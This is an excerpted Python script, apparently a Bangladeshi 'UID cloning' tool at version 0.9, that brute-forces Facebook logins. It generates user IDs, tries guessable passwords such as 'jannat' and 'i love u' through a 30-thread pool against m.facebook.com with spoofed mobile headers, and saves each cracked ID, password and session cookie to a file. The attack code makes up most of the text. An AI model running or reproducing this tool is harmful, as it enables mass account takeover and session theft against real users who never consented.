...
for ua in range(5000):
    ...
    c='itel L6502 Build/QP1A.190711.020; wv)'
    ...
    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[≋] 𝗧𝗘𝗔𝗠 & 𝗖𝗘𝗢      ●  𝗦𝗛𝗢𝗛𝗔𝗚-𝗞𝗛𝗔𝗡
[≋] 𝗧𝗢𝗢𝗟 & 𝗖𝗘𝗢      ●  𝗡𝗜𝗥𝗢𝗕 𝗦𝗛𝗘𝗜𝗞𝗛
[≋] 𝗧𝗢𝗟𝗟 𝗧𝗬𝗣𝗘         ● 𝗨𝗜𝗗 𝗖𝗟𝗢𝗡𝗜𝗡𝗚
[≋] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡            ●  𝟬.𝟵
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m""") 
#------------os clear def--------#
def clear():
...
class Cyber_Main:
    def __init__(self):
        ...
        clear()
        #os.system('xdg-open https://facebook.com/groups/412641030225365/')
        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m BD RANDOM CLONE')
...
def cyber_2():
    ...
    with ThreadPool(max_workers=30) as cyber:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'jannat','i love u']
...
def cyber_1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%s𝐂𝐘𝐁𝐄𝐑-𝟎𝟎𝟑𝟑\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
          ...
          # 'cookie': 'datr=SN27ZYGCXYPO5muCUX0KwY80; sb=SN27ZdbfzkVr_W-Yn9O-BsNu; ps_l=0; ps_n=0; vpd=v1%3B1031x517x1.18498694896698; locale=en_US; wl_cbv=v2%3Bclient_version%3A2407%3Btimestamp%3A1707676047; m_pixel_ratio=1.18498694896698; wd=608x1213; fr=08djt7NNOtqCW2vQW.AWW01oBD8fMa6sB4fkJQrPHKpIc.Blu91I..AAA.0.0.BlyRHG.AWV3unmeOGo',
          'dpr': '1.3937500715255737',
          'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=Afcy_QlG_PVrHsYw3dNaqnPOyOqwWqAZEBDXwXs8FZDVX9BvTURPdT37GKse_AThTCnQUCdCAKaNhFZJGdVKOHbDDfoAXeRJKKsqoyv_zS6RXg&smuh=24847&lh=Ac9ZJvnURdF64PjtWDU&wtsid=rdr_1mK72kWUjSUtOYi9c&_rdr',
          ...
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                #print('\r\r\033[1;32m[𝑪𝒀𝑩𝑬𝑹-OK💚] '+uid+'')
                print('\r\r\033[1;32m[𝗧𝗘𝗔𝗠-OK💚] ' +cid+ ' | ' +ps+    '  \n[‎‎🌺]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/OK.txt', 'a').write(cid+' | '+ps+' | '+coki+' | '+uid+'\n')
                oks.append(uid)
                break
